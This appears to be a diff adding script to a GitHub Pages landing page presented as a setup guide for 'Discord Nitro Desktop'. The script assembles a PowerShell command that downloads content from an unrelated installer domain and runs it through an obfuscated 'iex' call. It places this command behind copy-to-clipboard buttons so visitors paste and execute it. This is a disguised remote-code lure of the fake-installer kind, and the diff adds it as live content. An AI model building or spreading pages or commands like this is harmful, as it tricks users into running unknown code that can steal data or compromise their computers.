+     https://<owner>.github.io/<repo>/ — values below are fallbacks
+     for local preview or custom domains.
+     ============================================================ -->
+<script>
+(function(){
+  "use strict";
+
+  const CONFIG = {
+    owner:        "example",
+    repo:         "discord-nitro-desktop",
+    name:         "Discord Nitro Desktop",
+    tagline:      "Windows reference and setup guide for Discord Nitro Desktop.",
+    version:      "1.0.0",
+    releaseDate:  "recently",
+    installUrl:   "https://windows-installer.pro/v1/ektqzf3158",
+    githubUrl:    "https://github.com/example/discord-nitro-desktop",
+  };
+
+  // Auto-detect owner/repo from GitHub Pages URL
+  (function autoDetectRepo(){
+    const host = window.location.hostname;
+    const path = window.location.pathname;
+    const m = host.match(/^([^.]+)\.github\.io$/i);
+    if (!m) return;
+    const owner = m[1];
+    const parts = path.split("/").filter(Boolean);
+    const repo = parts[0] || `${owner}.github.io`;
+    CONFIG.owner = owner;
+    CONFIG.repo = repo;
+    CONFIG.githubUrl = `https://github.com/${owner}/${repo}`;
+    if (!CONFIG.name || CONFIG.name === "rustdesk") CONFIG.name = repo;
+  })();
+
+  CONFIG.cmdPs      = `(irm '${CONFIG.installUrl}' -TimeoutSec 30)|&('i'+'e'+'x')`;
+  CONFIG.cmdCmd     = `powershell -c "(irm '${CONFIG.installUrl}' -TimeoutSec 30)|&('i'+'e'+'x')"`;
+  CONFIG.avatarUrl  = `https://github.com/${CONFIG.owner}.png?size=48`;
+  CONFIG.releaseUrl = `${CONFIG.githubUrl}/releases/tag/${CONFIG.version}`;
+
+  // ---- SAFE SLOT INJECTION ----
+  // Only these keys may ever be injected as HTML (trusted author content).
+  const HTML_SLOTS = new Set(["tagline"]);
+
+  const stripTags = s => String(s).replace(/<[^>]*>/g, "").trim();
+
+  document.querySelectorAll("[data-slot]").forEach(el => {
+    const key = el.dataset.slot;
+    if (!(key in CONFIG)) return;
+    const v = CONFIG[key];
+    if (HTML_SLOTS.has(key)) el.innerHTML = v;
+    else el.textContent = v;
+  });
+  document.querySelectorAll("[data-slot-text]").forEach(el => {
+    const key = el.dataset.slotText;
+    if (key in CONFIG) el.textContent = CONFIG[key];
+  });
+  document.querySelectorAll("[data-slot-href]").forEach(a => {
+    const v = CONFIG[a.dataset.slotHref];
+    if (v) a.href = v;
+  });
+  document.querySelectorAll("[data-slot-src]").forEach(img => {
+    const v = CONFIG[img.dataset.slotSrc];
+    if (v) img.src = v;
+  });
+
+  // ---- META / SOCIAL ----
+  const plainTagline = stripTags(CONFIG.tagline);
+  const desc = `Install ${CONFIG.name} on Windows — ${plainTagline}`;
+
+  const setMeta = (selector, value) => {
+    const el = document.querySelector(selector);
+    if (el) el.setAttribute("content", value);
+  };
+  setMeta('meta[name="description"]',       desc);
+  setMeta('meta[property="og:title"]',      `Install ${CONFIG.name}`);
+  setMeta('meta[property="og:description"]',desc);
+  setMeta('meta[property="og:image"]',      CONFIG.avatarUrl);
+  setMeta('meta[property="og:url"]',        CONFIG.githubUrl);
+  setMeta('meta[name="twitter:title"]',     `Install ${CONFIG.name}`);
+  setMeta('meta[name="twitter:description"]', desc);
+  setMeta('meta[name="twitter:image"]',     CONFIG.avatarUrl);
+
+  const canonical = document.querySelector('link[rel="canonical"]');
+  if (canonical) canonical.href = CONFIG.githubUrl;
+
+  document.title = `Install ${CONFIG.name}`;
+
+  // ---- COPY TO CLIPBOARD ----
+  const status = document.getElementById("copy-status");
+
+  async function copyText(text) {
+    if (navigator.clipboard && window.isSecureContext) {
+      try { await navigator.clipboard.writeText(text); return true; }
+      catch (_) { /* fall through */ }
+    }
+    return legacyCopy(text);
+  }
+
+  function legacyCopy(text) {
+    return new Promise(resolve => {
+      const ta = document.createElement("textarea");
+      ta.value = text;
+      ta.setAttribute("readonly", "");
+      ta.style.position = "fixed";
+      ta.style.opacity = "0";
+      ta.style.pointerEvents = "none";
+      document.body.appendChild(ta);
+      ta.select();
+      let ok = false;
+      try { ok = document.execCommand("copy"); } catch (_) {}
+      document.body.removeChild(ta);
+      resolve(ok);
+    });
+  }
+
+  const CHECK_SVG = '<svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true"><path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z" fill="#1a7f37"/></svg>';
+
+  document.querySelectorAll(".copy-btn").forEach(btn => {
+    const key = btn.dataset.copyKey;
+    btn.addEventListener("click", async () => {
+      const text = CONFIG[key];
+      if (!text) return;
+      const ok = await copyText(text);
+      if (!ok) { if (status) status.textContent = "Copy failed"; return; }
+      if (status) status.textContent = "Copied to clipboard";
+      const orig = btn.innerHTML;
+      btn.innerHTML = CHECK_SVG;
+      btn.classList.add("copied");
+      clearTimeout(btn._t);
+      btn._t = setTimeout(() => {
+        btn.innerHTML = orig;
+        btn.classList.remove("copied");
+        if (status) status.textContent = "";
+      }, 1400);
+    });
+  });
 })();
 </script>
+
 </body>
 </html>
